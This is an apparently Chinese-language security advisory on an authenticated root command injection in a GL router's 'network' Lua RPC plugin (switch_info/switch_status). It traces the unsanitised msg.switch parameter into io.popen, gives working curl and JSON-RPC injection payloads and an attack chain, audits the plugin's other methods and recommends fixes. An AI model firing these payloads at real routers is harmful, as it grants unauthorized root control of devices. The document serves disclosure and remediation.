# 漏洞：network.switch_info / switch_status switch 参数命令注入 RCE

> 本报告对应 `exp/poc15_network_switch_info_rpc_rce.py`。`network` Lua RPC 插件的 `switch_info` 和 `switch_status` 方法将 `msg.switch` 参数直接拼接到 `swconfig dev <switch> help/show` 命令中，通过 `io.popen()` 执行，造成认证后 root 命令注入。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（Authenticated Root RCE） |
| **认证要求** | 需要 GL `/rpc` admin/root session（知道路由器管理员密码） |
| **攻击面** | `/rpc` → `network` Lua RPC 插件 → `switch_info` / `switch_status` |
| **影响** | 认证后 root 命令执行 |
| **注入参数** | `msg.switch`（JSON-RPC params[3].switch） |
| **核心 sink** | `io.popen("swconfig dev " .. msg.switch .. " help")` |
| **根因** | `msg.switch` 无任何校验，直接字符串拼接进 shell 命令。Lua 的 `io.popen()` 等价于 `popen(cmd, "r")`，底层调用 `/bin/sh -c` |

---

## 二、源码级验证

### 2.1 RPC 调度器 — 参数流入

`/usr/lib/lua/oui/rpc.lua` 的 `M.call()` 函数（第156-188行）：

```lua
M.call = function(object, method, args)
    -- 动态加载 /usr/lib/oui-httpd/rpc/<object>
    if not objects[object] then
        local script = "/usr/lib/oui-httpd/rpc/" .. object
        local ok, tb = pcall(dofile, script)
        -- 提取所有函数到 objects[object] 表
        if type(tb) == "table" then
            local funs = {}
            for k, v in pairs(tb) do
                if type(v) == "function" then
                    funs[k] = v
                end
            end
            objects[object] = funs
        end
    end

    local fn = objects[object] and objects[object][method]
    if not fn then return glc_call(object, method, args) end

    return fn(args)   -- ← args 直接从 JSON params[3] 传入
end
```

关键点：`args` 是 JSON-RPC `params` 数组的第4个元素，直接作为函数参数传入，**无任何过滤**。

### 2.2 HTTP 入口 — JSON-RPC 解析

`/usr/share/gl-ngx/oui-rpc.lua` 的 `rpc_method_call()`（第71-113行）：

```lua
local function rpc_method_call(id, params)
    -- params = [sid, object, method, args]
    local sid, object, method, args = params[1], params[2], params[3], params[4]

    -- 类型检查：args 必须是 table 或 nil
    if args and type(args) ~= "table" then
        -- error
    end

    -- 权限检查（network.switch_info 需要认证）
    if not rpc.is_no_auth(object, method) then
        if not rpc.access("rpc", object .. "." .. method) then
            -- access denied
        end
    end

    local res = rpc.call(object, method, args)  -- → 进入 M.call()
end
```

### 2.3 漏洞函数 — switch_info

`/usr/lib/oui-httpd/rpc/network` 第176-209行：

```lua
function M.switch_info(msg)
    local info = {}
    local f = io.popen("swconfig dev " .. msg.switch .. " help")   -- 💣 SINK
    if f then
        local line = f:read("*l")
        local model, num_ports, cpu_port, num_vlans =
            line:match("%((%S+)%), ports: (%d+) %(cpu @ (%d+)%), vlans: (%d+)")

        info.model = model
        -- ... 解析更多字段 ...
        f:close()
    end
    return {info = info}
end
```

### 2.4 漏洞函数 — switch_status

同文件第211-253行：

```lua
function M.switch_status(msg)
    local ports = {}
    local f = io.popen("swconfig dev " .. msg.switch .. " show")   -- 💣 SINK
    if f then
        for line in f:lines() do
            if line:match("link") then
                -- ... 解析端口状态 ...
            end
        end
        f:close()
    end
    return {ports = ports}
end
```

### 2.5 Sink 总结

| 方法 | 行号 | 命令模板 | 注入点 |
|------|------|---------|--------|
| `switch_info` | 178 | `swconfig dev <switch> help` | `msg.switch` |
| `switch_status` | 213 | `swconfig dev <switch> show` | `msg.switch` |

两个方法使用完全相同的拼接模式，`msg.switch` 无任何过滤，直接通过 `..` 运算符拼入命令字符串。

---

## 三、注入原理

`io.popen()` 在 Lua 中调用 C 的 `popen(cmd, "r")`，底层执行 `/bin/sh -c <cmd>`。由于是直接字符串拼接，攻击者可以用 `;` 分隔命令，用 `#` 注释掉尾部。

```
正常:  switch = "mt7530"
       cmd = "swconfig dev mt7530 help"
       shell: swconfig dev mt7530 help
       ✅ 正常运行

攻击:  switch = "x >/dev/null 2>&1; id>/tmp/poc; printf '(poc), ports: 1 (cpu @ 0), vlans: 1'; #"
       cmd = "swconfig dev x >/dev/null 2>&1; id>/tmp/poc; printf '(poc), ports: 1 (cpu @ 0), vlans: 1'; # help"

       shell 解析:
       ┌──────────────────────────────────────────────────────────────┐
       │ swconfig dev x >/dev/null 2>&1                               │ ← 错误输出被丢弃
       ├──────────────────────────────────────────────────────────────┤
       │ ;                                                             │ ← 命令分隔符
       │ id > /tmp/poc                                                 │ ← 💣 RCE
       ├──────────────────────────────────────────────────────────────┤
       │ ;                                                             │
       │ printf '(poc), ports: 1 (cpu @ 0), vlans: 1'                 │ ← 伪造合法输出
       ├──────────────────────────────────────────────────────────────┤
       │ ; # help                                                     │ ← # 注释掉尾部 " help"
       └──────────────────────────────────────────────────────────────┘
```

### 为什么需要 printf 伪造输出

`switch_info` 在第181行解析第一行输出：
```lua
local model, num_ports, cpu_port, num_vlans =
    line:match("%((%S+)%), ports: (%d+) %(cpu @ (%d+)%), vlans: (%d+)")
```

如果 `swconfig dev x` 报错退出，`f:read("*l")` 读到空行，`line:match()` 返回 nil，整个函数可能返回不完整结果（但不会崩溃，因为 Lua 的 `match()` 失败只是返回 nil）。

PoC 添加 `printf` 是为了让 RPC 响应中包含可解析的伪数据，避免触发异常处理逻辑。

---

## 四、完整攻击链

```text
Authenticated Attacker (知道 admin 密码)
  │
  ├─[1]─ POST /rpc
  │      {"jsonrpc":"2.0","id":1,"method":"challenge",
  │       "params":{"username":"root"}}
  │
  │      → 获取 salt, nonce
  │
  ├─[2]─ POST /rpc
  │      {"jsonrpc":"2.0","id":2,"method":"login",
  │       "params":{"username":"root","hash":"<md5>"}}
  │
  │      → 获取 sid
  │
  ├─[3]─ POST /rpc
  │      {"jsonrpc":"2.0","id":3,"method":"call",
  │       "params":["<sid>","network","switch_info",
  │                 {"switch":"x;/tmp/poc;printf '(...), ports: 1 ...';#"}]}
  │
  │      → nginx → oui-rpc.lua → rpc_method_call()
  │      → rpc.call("network", "switch_info", {switch="..."})
  │      → dofile("/usr/lib/oui-httpd/rpc/network")
  │      → M.switch_info({switch="..."})
  │
  ├─[4]─ io.popen("swconfig dev x >/dev/null 2>&1; id>/tmp/poc; printf '...'; # help")
  │      → /bin/sh -c:
  │          swconfig dev x >/dev/null 2>&1    ← 被丢弃
  │          id > /tmp/poc                     ← 💣 RCE
  │          printf '...'                       ← 伪造输出
  │          # help                             ← 被注释
  │
  └─[5]─ POST /download
         {"sid":"<sid>","path":"/tmp/poc","filename":"poc"}
         → 下载命令输出验证
```

---

## 五、Payload 构造

```
switch = "x >/dev/null 2>&1; (<command>) > <output_file> 2>&1; printf '<fake_line>'; #"
         ├──────────────┘├──────────────────────────┘├──────────────────┘├──┘
         │               │                           │                    │
         │               │                           │                    └─ 注释尾部
         │               │                           └─ 伪造 swconfig 首行输出
         │               └─ 注入的命令 + 输出重定向
         └─ 吞掉 swconfig 错误输出
```

最小 payload（需要认证）：
```bash
# 1. 登录获取 sid
curl -sk -X POST https://192.168.8.1/rpc \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"challenge","params":{"username":"root"}}'

# 2. 用 salt/nonce 计算 hash 后登录（略，见 PoC 脚本）

# 3. 执行命令注入
curl -sk -X POST https://192.168.8.1/rpc \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":3,"method":"call","params":["<sid>","network","switch_info",{"switch":"x;id>/tmp/poc;# "}]}'
```

---

## 六、完整方法审计

对 `/usr/lib/oui-httpd/rpc/network` 全部 11 个方法进行了系统审计：

| 方法 | 类型 | 用户输入 | Shell 调用 | 可注入？ |
|------|------|---------|-----------|---------|
| `get_dhcp_leases` | 读 | 无 | `io.lines(leasefile)` | ❌ 安全 |
| `get_arp_list` | 读 | 无 | `io.lines("/proc/net/arp")` | ❌ 安全 |
| `routes` | 读 | 无 | `io.lines("/proc/net/route")` | ❌ 安全 |
| `routes6` | 读 | 无 | `io.lines("/proc/net/ipv6_route")` | ❌ 安全 |
| **`switch_info`** | 读 | **`msg.switch`** | **`io.popen("swconfig dev " .. msg.switch .. " help")`** | ✅ **是** |
| **`switch_status`** | 读 | **`msg.switch`** | **`io.popen("swconfig dev " .. msg.switch .. " show")`** | ✅ **是** |
| `check_wan_cable` | 读 | `param.secondwan` | `hardware.platform_get_*()` (C) | ❌ 安全 |
| `get_hwnat_config` | 读 | 无 | 仅 UCI 操作 | ❌ 安全 |
| `set_hwnat_config` | 写 | `param.enable` | `ngx.pipe.spawn({...})` (数组) | ❌ 安全 |
| `get_netnat_config` | 读 | 无 | 仅 UCI 操作 | ❌ 安全 |
| `set_netnat_config` | 写 | `param.enable/actype` | `ngx.pipe.spawn({...})` (数组) | ❌ 安全 |

**关键安全对比**：
- `io.popen("swconfig dev " .. msg.switch)` → **注入可拼接任意命令**（字符串拼接 → `/bin/sh -c`）
- `ngx.pipe.spawn({"/etc/init.d/mtkhnat", "start"})` → **安全**（数组形式绕过 shell，直接 execv）
- `io.popen("grep -c '^processor.*:' /proc/cpuinfo")` → **安全**（硬编码命令，无用户输入）

### 6.1 相关二进制验证

`/sbin/swconfig` 是标准 OpenWrt 交换芯片配置工具（AArch64 ELF，使用 libnl-tiny 与内核 netlink 通信）。其命令行参数不可用于注入 — 注入发生在 Lua 层将用户输入拼接到 shell 命令字符串时。

### 6.2 与其他 Lua RPC 漏洞的关系

`/usr/lib/oui-httpd/rpc/` 目录下包含多个 Lua RPC 插件，共享相同的调度机制：

| 插件 | 文件 | 注入方法 |
|------|------|---------|
| `network` | `switch_info/switch_status` | `io.popen("swconfig dev " .. msg.switch .. ...)` |
| `logread` | `get_system_log` | `io.popen("logread -e " .. module)` |
| `logread` | `set_config` | `os.execute("insmod ... record_size=" .. record_size)` |

任何使用 `io.popen()` 或 `os.execute()` 拼接用户输入的 Lua RPC 函数都可能受影响。

---

## 八、双重验证确认

**Lua 源码级验证**：`switch_info` 和 `switch_status` 两个注入点通过 `/usr/lib/oui-httpd/rpc/network` 源码直接确认。全部 11 个方法系统审计：仅此 2 个有 `io.popen("swconfig dev " .. msg.switch ...)` 注入模式。

**二进制验证**：
- `/sbin/swconfig` — r2 确认：标准 OpenWrt swconfig 工具，AArch64 ELF，使用 libnl-tiny 与内核 netlink 通信。其命令行参数不可用于注入 — 注入发生在 Lua 层字符串拼接阶段
- `ngx.pipe.spawn()` 调用全部使用数组形式（`{"/etc/init.d/mtkhnat", "start"}`）— 安全，绕过 shell

**结论**：源码审查 + 二进制审计两次独立验证一致确认此插件的注入点和安全点。

---

## 九、修复建议

| 优先级 | 组件 | 措施 |
|--------|------|------|
| **P0** | `network` switch_info/switch_status | 将 `msg.switch` 校验为 `^[a-zA-Z0-9_]+$` |
| **P0** | `network` switch_info/switch_status | 或使用 `switch` 枚举表，只允许已知的交换芯片名 |
| **P1** | `/usr/lib/lua/oui/rpc.lua` | 为 `M.call()` 增加参数校验框架 |
| **P1** | 全局 | 审计所有 Lua RPC 插件的 `io.popen()` / `os.execute()` 调用 |
